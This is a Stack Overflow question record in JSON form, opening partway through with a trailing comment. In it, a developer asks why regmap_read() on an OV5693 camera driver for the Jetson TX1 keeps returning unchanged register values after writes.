"display_name": "0andriy", "link": "https://stackoverflow.com/users/2511795/0andriy"}, "edited": false, "score": 0, "creation_date": 1526150650, "post_id": 50008177, "comment_id": 87635070, "body": "Some of the hardware might have so called <b>write-only</b> registers. Look at datasheet for your device in question to see if it&#39;s the case. Another possibility that special sequence to flush values before read is needed."}], "owner": {"reputation": 19, "user_id": 9690994, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "AlexS", "link": "https://stackoverflow.com/users/9690994/alexs"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 1130, "favorite_count": 1, "answer_count": 0, "score": 1, "last_activity_date": 1524593010, "creation_date": 1524593010, "question_id": 50008177, "link": "https://stackoverflow.com/questions/50008177/reading-i2c-register-with-regmap-read-but-getting-constant-values", "title": "Reading I2C register with regmap_read() but getting constant values", "body": "<p>This might actually be a question about how <code>regmap.c</code> works in general but, currently, I do have a specific question regarding the usage of <code>regmap_read()</code>.</p>\n\n<p>I am studying and modifying a reference driver implementation for a ov5693 camera to be used in a Jetson TX1 (using nVidia code example, provided in the  <em><a href=\"https://developer.nvidia.com/embedded/dlc/l4t-documentation-24-1\" rel=\"nofollow noreferrer\">NVIDIA Tegra Linux Driver Package Development Guide</a></em>). The way I understand it is that, the camera has MIPI CSI-2 data that is treated by nVidia's driver \"somewhere else\" and the part I am modifying is the I2C part of the driver, where it is defined as a V4L2 subdevice and registers my camera as an I2C device and, there, I'm also able to implement some external V4L2 commands to be called via <code>ioctl()</code>.</p>\n\n<p>The driver's main functionalities are working according to what I expected. I'm able to capture frames and writing (via <code>write_reg()</code>) different values to the register related to the 'gain' in the sensor does result in changes in the images I capture.</p>\n\n<p>Then, I wrote a simple function to be called by through a custom V4L2 <code>ioctl</code> command, to print the value of a register at a given address (to be read at <code>dmesg</code>). What I do is, roughly, something among the lines of</p>\n\n<pre><code>test_function(struct camera_common_data *s_data, unsigned int val){\n    struct ov5693 *priv = (struct ov5693 *)s_data-&gt;priv;\n    int err;\n    u16 address;\n    u8 value;\n\n    address = (u16)(val &amp; 0xffff);\n    err = read_reg(priv-&gt;regmap, (unsigned int)address, (unsigned int *)(&amp;value));\n    printk(\"debug: %s: addr=0x%04X, val=0x%02X\\n\", __func__, address, value);\n}\n</code></pre>\n\n<p>The struct <code>ov5693</code> contains various V4L2 structs and other variables, and regmap is of the correct type to be passed to <code>read_reg()</code>.</p>\n\n<p>So, this function does print values that, mostly, happen to match the default values indicated in the sensor datasheet.</p>\n\n<p><em>And here is where my trouble begins</em>. <strong>Even though I <em>know</em> that I've been indeed able to write values to the I2C register</strong> (as I've mentioned before, I wrote different values for the register related to the 'gain' of the sensor, and I was able capture different images, each image having changed in the expected way, appropriately to the 'gain' value) <strong>whenever I try to read the same register, even after writing different values, it always shows the same (initial) value</strong>.</p>\n\n<p>It seems to me like I'm somehow reading from a kind of cached version of the register(?). If that's the case, I couldn't really understand either how or why it happens. Or I might even be misunderstanding the whole process of how <code>regmap.c</code> works.</p>\n\n<p>All I wanted to do was to be able to read the <em>actual</em> value stored in the register, but so far I think I didn't get anywhere closer to that.</p>\n\n<p>Do anyone happen to know something about this? Might be something about <code>regmap.c</code> that I'm neglecting or something about the way my device's register map is set (if that's the case, what exactly)? I would be grateful for any hints, leads or advices!</p>\n"}]